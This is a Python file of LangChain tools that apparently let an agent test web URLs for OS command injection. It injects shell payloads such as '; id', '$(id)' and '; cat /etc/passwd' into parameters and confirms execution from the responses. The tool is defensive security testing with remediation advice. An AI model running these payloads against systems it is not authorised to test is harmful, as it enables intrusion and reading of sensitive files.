"""
Command Injection tester - tests for OS command injection vulnerabilities
Only reports CONFIRMED vulnerabilities with actual command execution proof
"""
from langchain.tools import tool
import subprocess
import re
import urllib.parse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


@tool()
def test_command_injection(url: str, parameter: str = "", method: str = "GET", post_data: str = "") -> str:
    """
    Test for command injection vulnerabilities with verification.
    Only reports if actual command output is visible in the response.
    
    Args:
        url: Target URL to test
        parameter: Specific parameter to test (optional, tests all if not specified)
        method: HTTP method - GET or POST (default: GET)
        post_data: POST data in format "param1=val1&param2=val2" (only for POST)
    
    Returns:
        Report of confirmed command injection vulnerabilities with proof of execution
    
    Example:
        test_command_injection(url="http://example.com/ping?ip=127.0.0.1", parameter="ip")
    """
    
    print(f"[*] Command Injection Testing: {url}")
    
    results = []
    confirmed_vulns = []
    
    # Command injection payloads with verification patterns
    # Format: (payload, expected_output_pattern, description)
    test_cases = [
        # Unix/Linux commands
        ("; id", r"uid=\d+.*gid=\d+", "User ID enumeration (id)"),
        ("| id", r"uid=\d+.*gid=\d+", "User ID via pipe (id)"),
        ("` id `", r"uid=\d+.*gid=\d+", "User ID via backticks (id)"),
        ("$(id)", r"uid=\d+.*gid=\d+", "User ID via substitution (id)"),
        
        # File reading
        ("; cat /etc/passwd", r"root:.*:0:0:", "/etc/passwd contents"),
        ("| cat /etc/passwd", r"root:.*:0:0:", "/etc/passwd via pipe"),
        ("; cat /etc/hostname", r"[\w\-]+", "Hostname retrieval"),
        
        # Directory listing
        ("; ls -la", r"total\s+\d+", "Directory listing (ls)"),
        ("; pwd", r"/[\w/]+", "Current directory (pwd)"),
        
        # System info
        ("; uname -a", r"Linux|Darwin|FreeBSD", "Kernel version"),
        ("; whoami", r"[\w\-]+", "Current user"),
        
        # Network commands
        ("; ping -c 1 127.0.0.1", r"1 packets transmitted", "Ping localhost"),
        
        # Windows commands
        ("& whoami", r"[\w\-\\\\]+", "Windows whoami"),
        ("| whoami", r"[\w\-\\\\]+", "Windows whoami via pipe"),
        ("& dir", r"Directory of", "Windows directory listing"),
        ("& type C:\\Windows\\System.ini", r"\[drivers\]", "Windows system.ini"),
    ]
    
    if method.upper() == "GET":
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return "[-] No parameters found in URL for GET testing"
        
        param_list = [parameter] if parameter else list(params.keys())
        
        for param_name in param_list:
            print(f"  Testing parameter: {param_name}")
            
            for payload, pattern, description in test_cases:
                # Build test URL
                test_params = params.copy()
                original_value = test_params.get(param_name, [''])[0]
                test_params[param_name] = [original_value + payload]
                
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    new_query,
                    parsed.fragment
                ))
                
                try:
                    result = subprocess.run(
                        ['curl', '-s', '-L', '--max-time', '10', test_url],
                        capture_output=True,
                        text=True,
                        timeout=15
                    )
                    
                    response = result.stdout
                    
                    # Check if command output is in response
                    if re.search(pattern, response, re.MULTILINE):
                        # CONFIRMED: Command executed and output visible
                        match = re.search(pattern, response, re.MULTILINE)
                        evidence = match.group(0) if match else "Pattern matched"
                        
                        confirmed_vulns.append({
                            'parameter': param_name,
                            'payload': payload,
                            'description': description,
                            'evidence': evidence,
                            'url': test_url[:100]
                        })
                        
                        results.append(f"[!] CONFIRMED: {param_name} - {description}")
                        results.append(f"    Payload: {payload}")
                        results.append(f"    Evidence: {evidence[:100]}")
                        
                        # Found one confirmed - that's enough proof
                        break
                
                except Exception as e:
                    continue
            
            if confirmed_vulns:
                # Found confirmed vuln in this parameter, move to next
                break
    
    elif method.upper() == "POST":
        if not post_data:
            return "[-] No post_data provided for POST testing"
        
        params = parse_qs(post_data)
        param_list = [parameter] if parameter else list(params.keys())
        
        for param_name in param_list:
            print(f"  Testing POST parameter: {param_name}")
            
            for payload, pattern, description in test_cases:
                # Build test POST data
                test_params = params.copy()
                original_value = test_params.get(param_name, [''])[0]
                test_params[param_name] = [original_value + payload]
                test_data = urlencode(test_params, doseq=True)
                
                try:
                    result = subprocess.run(
                        ['curl', '-s', '-L', '-X', 'POST', '-d', test_data, 
                         '--max-time', '10', url],
                        capture_output=True,
                        text=True,
                        timeout=15
                    )
                    
                    response = result.stdout
                    
                    # Check if command output is in response
                    if re.search(pattern, response, re.MULTILINE):
                        match = re.search(pattern, response, re.MULTILINE)
                        evidence = match.group(0) if match else "Pattern matched"
                        
                        confirmed_vulns.append({
                            'parameter': param_name,
                            'payload': payload,
                            'description': description,
                            'evidence': evidence,
                            'method': 'POST'
                        })
                        
                        results.append(f"[!] CONFIRMED (POST): {param_name} - {description}")
                        results.append(f"    Payload: {payload}")
                        results.append(f"    Evidence: {evidence[:100]}")
                        
                        break
                
                except Exception as e:
                    continue
            
            if confirmed_vulns:
                break
    
    # Build report
    summary = []
    summary.append(f"Command Injection Testing Report")
    summary.append(f"{'='*60}")
    summary.append(f"Target: {url}")
    summary.append(f"Method: {method}")
    summary.append(f"Parameter: {parameter or 'all parameters'}")
    summary.append(f"Confirmed Vulnerabilities: {len(confirmed_vulns)}")
    summary.append(f"{'='*60}\n")
    
    if confirmed_vulns:
        summary.append(f"[!] CRITICAL: COMMAND INJECTION CONFIRMED")
        summary.append(f"")
        for vuln in confirmed_vulns:
            summary.append(f"✗ Command Injection in: {vuln['parameter']}")
            summary.append(f"  Payload: {vuln['payload']}")
            summary.append(f"  Test: {vuln['description']}")
            summary.append(f"  Evidence: {vuln['evidence'][:150]}")
            summary.append(f"  Severity: CRITICAL")
            summary.append(f"")
        
        summary.append(f"Recommendation: IMMEDIATE remediation required!")
        summary.append(f"- Never pass user input to system commands")
        summary.append(f"- Use language-specific APIs instead of shell commands")
        summary.append(f"- If unavoidable, use strict whitelisting and escaping")
    else:
        summary.append(f"✓ No confirmed command injection vulnerabilities")
        summary.append(f"  Note: Only reporting verified vulnerabilities with command execution proof")
    
    if results:
        summary.append(f"\nDetailed Results:")
        summary.extend(results[:20])
    
    return '\n'.join(summary)


@tool()
def quick_command_injection_check(url: str) -> str:
    """
    Quick command injection check using simple payloads.
    Tests for common shell error messages and command outputs.
    
    Args:
        url: Target URL with parameter to test
    
    Returns:
        Quick check results
    """
    
    print(f"[*] Quick Command Injection Check: {url}")
    
    # Simple test payloads
    payloads = [
        "; id",
        "| id",
        "` id `",
        "$(id)",
        "; ls",
    ]
    
    error_patterns = [
        r"sh:|bash:|cmd\.exe",  # Shell errors
        r"uid=\d+",  # id output
        r"root:.*:0:0:",  # /etc/passwd
        r"total\s+\d+",  # ls output
    ]
    
    for payload in payloads:
        test_url = url + urllib.parse.quote(payload) if '?' in url else url + '?id=' + urllib.parse.quote(payload)
        
        try:
            result = subprocess.run(
                ['curl', '-s', '-L', '--max-time', '5', test_url],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            response = result.stdout
            
            for pattern in error_patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    return f"[!] Potential command injection detected\n" + \
                           f"Payload: {payload}\n" + \
                           f"Pattern matched: {pattern}\n" + \
                           f"Recommendation: Run full test_command_injection() for confirmation"
        
        except Exception:
            continue
    
    return "✓ No obvious command injection indicators in quick check"
